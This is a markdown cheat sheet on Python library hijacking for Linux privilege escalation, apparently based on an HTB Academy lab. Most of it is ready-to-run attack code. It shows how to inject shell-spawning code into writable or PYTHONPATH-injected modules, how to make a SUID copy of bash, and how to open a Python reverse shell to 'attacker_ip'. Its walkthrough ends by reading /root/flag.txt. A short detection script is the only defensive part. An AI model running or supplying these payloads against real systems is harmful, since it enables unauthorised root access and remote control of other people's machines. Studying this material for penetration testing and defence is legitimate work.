# 🐍 Python Library Hijacking

## 🎯 Overview

Python library hijacking exploits Python's module import system through writable modules, path manipulation, or PYTHONPATH environment variable abuse to achieve privilege escalation.

## 🔍 Attack Vectors

### 1. Wrong Write Permissions
- **Writable Python modules** in system directories
- **SUID Python scripts** importing vulnerable modules
- **Direct code injection** into existing modules

### 2. Library Path Manipulation
- **Higher priority paths** in sys.path that are writable
- **Module name collision** with legitimate modules
- **Path precedence exploitation**

### 3. PYTHONPATH Environment Variable
- **sudo SETENV permissions** for Python
- **Environment variable manipulation** to redirect imports
- **Custom module directories** via PYTHONPATH

## 🔍 Enumeration & Detection

### Check Python Paths
```bash
# List Python import paths (priority order)
python3 -c 'import sys; print("\n".join(sys.path))'

# Check for writable paths
python3 -c 'import sys; print("\n".join(sys.path))' | while read path; do
    if [ -w "$path" 2>/dev/null ]; then
        echo "WRITABLE: $path"
    fi
done
```

### Find SUID Python Scripts
```bash
# Find SUID Python scripts
find / -name "*.py" -perm -4000 2>/dev/null

# Check script contents
cat suspicious_script.py
```

### Check Sudo Permissions
```bash
# Look for SETENV permissions
sudo -l | grep -E "(SETENV|python)"

# Example: (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3
```

## 🚀 Exploitation Methods

### Method 1: Writable Module Hijacking
```bash
# 1. Find SUID Python script
ls -la mem_status.py
# -rwsrwxr-x 1 root mrb3n 188 Dec 13 20:13 mem_status.py

# 2. Check imports
cat mem_status.py
# import psutil

# 3. Find module location
grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*

# 4. Check permissions
ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
# -rw-r--rw- 1 root staff 87339 Dec 13 20:07

# 5. Inject malicious code
# Edit the virtual_memory() function:
# def virtual_memory():
#     import os
#     os.system('id')  # or os.system('/bin/bash')
```

### Method 2: Path Precedence Exploitation
```bash
# 1. Check Python paths
python3 -c 'import sys; print("\n".join(sys.path))'

# 2. Find writable higher-priority directory
ls -la /usr/lib/python3.8/
# drwxr-xrwx 30 root root 20480 Dec 14 16:26

# 3. Create malicious module
cat > /usr/lib/python3.8/psutil.py << EOF
#!/usr/bin/env python3
import os

def virtual_memory():
    os.system('id')
    # Return None to avoid attribute errors
EOF

# 4. Execute SUID script
sudo python3 mem_status.py
```

### Method 3: PYTHONPATH Environment Variable
```bash
# 1. Check sudo SETENV permissions
sudo -l | grep SETENV

# 2. Create malicious module in accessible directory
cat > /tmp/psutil.py << EOF
#!/usr/bin/env python3
import os

def virtual_memory():
    os.system('/bin/bash')
EOF

# 3. Execute with custom PYTHONPATH
sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py
```

## 🔧 Advanced Techniques

### Multi-Function Module Creation
```bash
# Create comprehensive replacement module
cat > /tmp/psutil.py << EOF
#!/usr/bin/env python3
import os

def virtual_memory():
    os.system('cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash')
    # Return fake object to avoid errors
    class FakeMemory:
        def __init__(self):
            self.total = 100
            self.available = 80
    return FakeMemory()

# Add other common functions to avoid errors
def cpu_percent(): return 50
def disk_usage(path): return None
EOF
```

### Reverse Shell Integration
```bash
cat > /tmp/hijacked_module.py << EOF
#!/usr/bin/env python3
import os
import socket
import subprocess

def target_function():
    # Reverse shell
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("attacker_ip", 4444))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/bash", "-i"])
EOF
```

## 🔍 Detection Script

```bash
#!/bin/bash
echo "=== PYTHON LIBRARY HIJACKING CHECK ==="

echo "[+] Python paths (priority order):"
python3 -c 'import sys; print("\n".join(sys.path))' 2>/dev/null

echo "[+] Writable Python paths:"
python3 -c 'import sys; print("\n".join(sys.path))' 2>/dev/null | while read path; do
    if [ -w "$path" 2>/dev/null ]; then
        echo "  WRITABLE: $path"
    fi
done

echo "[+] SUID Python scripts:"
find / -name "*.py" -perm -4000 2>/dev/null

echo "[+] Python sudo permissions:"
sudo -l 2>/dev/null | grep -E "(SETENV.*python|python.*SETENV)"

echo "[+] Writable site-packages:"
find /usr -name "site-packages" -writable 2>/dev/null
find /usr -name "dist-packages" -writable 2>/dev/null
```

## 🔑 Quick Reference

### Immediate Checks
```bash
# Check Python paths
python3 -c 'import sys; print("\n".join(sys.path))'

# Find SUID Python scripts
find / -name "*.py" -perm -4000 2>/dev/null

# Check sudo SETENV
sudo -l | grep SETENV | grep python
```

### Emergency Exploitation
```bash
# If writable high-priority path found
echo 'import os; def target_function(): os.system("/bin/bash")' > /writable/path/module.py

# If PYTHONPATH manipulation allowed
sudo PYTHONPATH=/tmp/ python3 script.py

# Quick module replacement
cp legitimate_module.py malicious_module.py
# Edit malicious_module.py to add: os.system('/bin/bash')
```

### HTB Academy Lab Example
```bash
# 1. Connect to target
ssh htb-student@target

# 2. Check environment
ls  # mem_status.py
cat mem_status.py
# #!/usr/bin/env python3
# import psutil
# available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total

# 3. Check sudo permissions
sudo -l
# (ALL) NOPASSWD: /usr/bin/python3 /home/htb-student/mem_status.py

# 4. Find writable psutil module
grep -r "def virtual_memory*" /usr/
ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
# -rw-r--r-- 1 htb-student staff 87657 Jun 8 09:21

# 5. Edit psutil module
vim /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
# In virtual_memory() function, add:
# import os
# os.system('cat /root/flag.txt')

# 6. Execute for flag
sudo /usr/bin/python3 /home/htb-student/mem_status.py
# Result: HTB{...
```

## 🔧 Common Python Modules to Target

### Frequently Imported Modules
```bash
# Common targets for hijacking
os, sys, subprocess, socket
requests, urllib, json
psutil, pandas, numpy
flask, django, tornado
```

### Module Discovery in Scripts
```bash
# Extract imports from Python scripts
grep -E "^import |^from .* import" script.py

# Find all Python scripts and their imports
find / -name "*.py" -exec grep -l "import" {} \; 2>/dev/null
```

---

*Python library hijacking exploits the module import system - writable library paths, path precedence, and environment variable manipulation can redirect imports to malicious code for privilege escalation.* 